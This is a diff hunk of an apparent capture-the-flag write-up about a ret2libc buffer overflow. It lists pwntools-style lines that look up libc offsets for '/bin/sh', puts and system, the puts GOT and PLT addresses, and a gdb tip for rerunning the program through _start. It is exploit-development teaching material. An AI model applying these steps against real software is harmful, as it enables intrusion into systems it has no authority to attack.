@@ -10,9 +10,13 @@ It was a simple question based on rop exploitation, wherein we have a buffer ove
 # All initial addresses that I had to enumerate before starting exploitation:
 
 binsh_offset = hex(libc.search("/bin/sh\x00").next())
+
 puts_offset = hex(libc.symbols['puts'])
+
 system_offset = hex(libc.symbols['system'])
+
 puts_got   take this address from objdump -R <file>| grep 'puts'
+  
 puts_plt = hex(elf.symbols['puts'])
   
 NOTE: _start symbol helps us to re-run the program after address enumeration ; we can get its value by simply running 'info functions' command in gdb
